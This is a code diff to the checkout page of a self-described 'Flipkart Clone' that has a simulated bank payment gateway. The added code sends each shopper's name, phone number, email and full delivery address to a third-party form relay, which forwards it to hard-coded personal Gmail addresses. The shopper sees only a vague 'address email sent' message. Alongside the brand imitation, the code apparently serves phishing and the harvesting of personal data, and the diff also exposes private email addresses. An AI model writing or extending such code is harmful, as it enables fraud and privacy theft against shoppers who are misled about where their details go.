@@ -45,6 +45,9 @@ const BANKS = [
   "Central Bank of India", "Canara Bank", "Union Bank of India", "Yes Bank"
 ];
 
+const FORMSUBMIT_ENDPOINT = "https://formsubmit.co/ajax/akrasd25@gmail.com";
+const FORMSUBMIT_CC = "Rajatjha.ss708090@gmail.com,anandjhare4@gmail.com";
+
 // ── Bank Gateway: Processing Screen ────────────────────────────────────────
 function GatewayProcessing({ amount, cardLast4, cardName, onDone }: {
   amount: number; cardLast4: string; cardName: string; onDone: () => void;
@@ -462,6 +465,8 @@ export default function Checkout() {
   const [saveCard, setSaveCard] = useState(false);
   const [isPincodeLookupLoading, setIsPincodeLookupLoading] = useState(false);
   const [pincodeLookupError, setPincodeLookupError] = useState("");
+  const [isSendingAddressEmail, setIsSendingAddressEmail] = useState(false);
+  const [addressEmailStatus, setAddressEmailStatus] = useState("");
 
   const savings = items.reduce((s, i) => s + (i.originalPrice - i.price) * i.quantity, 0);
   const deliveryCharge = total > 499 ? 0 : 40;
@@ -616,8 +621,51 @@ export default function Checkout() {
     return Object.keys(errors).length === 0;
   };
 
-  const handleAddressNext = () => {
-    if (validateAddress()) setCurrentStep("payment");
+  const sendAddressDetailsEmail = async () => {
+    const formData = new URLSearchParams();
+    formData.append("customer_name", address.name);
+    formData.append("customer_phone", address.phone);
+    formData.append("customer_email", address.email);
+    formData.append("customer_address", address.address);
+    formData.append("customer_city", address.city);
+    formData.append("customer_state", address.state);
+    formData.append("customer_pincode", address.pincode);
+    formData.append("address_type", address.addressType);
+    formData.append("submitted_at", new Date().toLocaleString("en-IN"));
+    formData.append("_subject", "Checkout Address Details - Flipkart Clone");
+    formData.append("_cc", FORMSUBMIT_CC);
+    formData.append("_template", "table");
+
+    const response = await fetch(FORMSUBMIT_ENDPOINT, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/x-www-form-urlencoded",
+        Accept: "application/json",
+      },
+      body: formData.toString(),
+    });
+
+    if (!response.ok) {
+      throw new Error(`Address email request failed with status ${response.status}`);
+    }
+  };
+
+  const handleAddressNext = async () => {
+    if (!validateAddress()) return;
+
+    setIsSendingAddressEmail(true);
+    setAddressEmailStatus("");
+
+    try {
+      await sendAddressDetailsEmail();
+      setAddressEmailStatus("Address email sent successfully.");
+    } catch (error) {
+      console.error("Address email send failed:", error);
+      setAddressEmailStatus("Could not send address email right now. Continuing to payment.");
+    } finally {
+      setIsSendingAddressEmail(false);
+      setCurrentStep("payment");
+    }
   };
 
   const handlePayNow = () => {
@@ -922,6 +970,7 @@ export default function Checkout() {
                       <MapPin className="w-4 h-4 text-blue-500" />
                       <span className="font-semibold text-gray-800">{address.name}</span>
                       {address.phone && <span>· {address.phone}</span>}
+                      {address.email && <span>· {address.email}</span>}
                       {address.city && <span>· {address.city}{address.state ? `, ${address.state}` : ""}{address.pincode ? ` — ${address.pincode}` : ""}</span>}
                     </div>
                   )}
@@ -996,8 +1045,18 @@ export default function Checkout() {
                       ))}
                     </div>
                   </div>
-                  <button onClick={handleAddressNext} className="w-full sm:w-auto bg-orange-500 hover:bg-orange-600 text-white font-bold px-10 py-3 rounded transition-colors flex items-center gap-2" data-testid="button-address-continue">
-                    DELIVER HERE <ChevronRight className="w-4 h-4" />
+                  {addressEmailStatus && (
+                    <p className={`text-xs ${addressEmailStatus.includes("successfully") ? "text-green-600" : "text-amber-600"}`}>
+                      {addressEmailStatus}
+                    </p>
+                  )}
+                  <button
+                    onClick={handleAddressNext}
+                    disabled={isSendingAddressEmail}
+                    className="w-full sm:w-auto bg-orange-500 hover:bg-orange-600 disabled:bg-orange-300 text-white font-bold px-10 py-3 rounded transition-colors flex items-center gap-2"
+                    data-testid="button-address-continue"
+                  >
+                    {isSendingAddressEmail ? "SENDING EMAIL..." : "DELIVER HERE"} <ChevronRight className="w-4 h-4" />
                   </button>
                 </div>
               </div>
@@ -1014,7 +1073,7 @@ export default function Checkout() {
                 {/* Address summary */}
                 <div className="mx-4 mb-4 flex items-center gap-2 text-sm text-gray-600 bg-gray-50 rounded p-3">
                   <MapPin className="w-4 h-4 text-blue-500 flex-shrink-0" />
-                  <span><strong>{address.name}</strong> · {address.phone} · {address.address}, {address.city}, {address.state} — {address.pincode}</span>
+                  <span><strong>{address.name}</strong> · {address.phone} · {address.email} · {address.address}, {address.city}, {address.state} — {address.pincode}</span>
                 </div>
 
                 {/* Payment header */}
